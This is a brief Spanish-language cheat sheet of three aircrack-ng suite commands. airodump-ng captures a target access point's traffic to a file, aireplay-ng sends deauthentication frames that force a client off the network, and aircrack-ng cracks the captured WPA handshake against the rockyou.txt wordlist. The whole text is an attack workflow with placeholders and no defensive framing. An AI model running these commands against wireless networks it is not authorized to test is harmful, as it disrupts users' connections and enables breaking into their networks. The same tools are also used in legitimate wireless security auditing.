

# Escaneo Por Bssid Con Escritura
airodump-ng -c CANAL --bssid BSSID -w file NOMBRE-INTERFAZ

# Ataque de Deauthenticacion
aireplay-ng -0 9 BSSID -c CLIENTE NOMBRE-INTERFAZ

# Descifrado de Handshake
aircrack-ng -b HASH -w rockyou.txt FILE.cap